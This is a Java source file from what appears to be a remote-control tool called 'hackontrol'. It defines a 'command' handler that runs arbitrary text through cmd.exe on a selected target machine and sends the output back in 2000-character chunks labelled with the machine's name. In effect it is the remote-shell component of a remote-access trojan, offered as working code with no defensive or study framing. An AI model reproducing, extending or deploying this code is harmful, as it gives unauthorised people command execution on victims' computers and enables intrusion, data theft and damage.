package com.khopan.hackontrol.command;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.source.CommandSource;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;

public class CommandCommand implements Command {
	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("command").requires(source -> source.isSelected()).then(RequiredArgumentBuilder.<CommandSource, String>argument("command", StringArgumentType.greedyString()).executes(context -> {
			CommandSource source = context.getSource();
			String command = StringArgumentType.getString(context, "command");
			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
			builder.redirectErrorStream(true);
			Process process;

			try {
				process = builder.start();
			} catch(Throwable Errors) {
				source.message("Error: " + Errors.toString());
				return -1;
			}

			InputStream stream = process.getInputStream();
			byte[] data;

			try {
				data = stream.readAllBytes();
			} catch(Throwable Errors) {
				source.message("Error: " + Errors.toString());
				return -1;
			}

			String result = '`' + source.getName() + "`: " + new String(data, StandardCharsets.UTF_8);

			for(String part : CommandCommand.getParts(result, 2000)) {
				source.sendMessage(part);
			}

			return 1;
		})));
	}

	private static List<String> getParts(String text, int partitionSize) {
		List<String> parts = new ArrayList<String>();
		int length = text.length();

		for(int i = 0; i < length; i += partitionSize) {
			parts.add(text.substring(i, Math.min(length, i + partitionSize)));
		}

		return parts;
	}
}
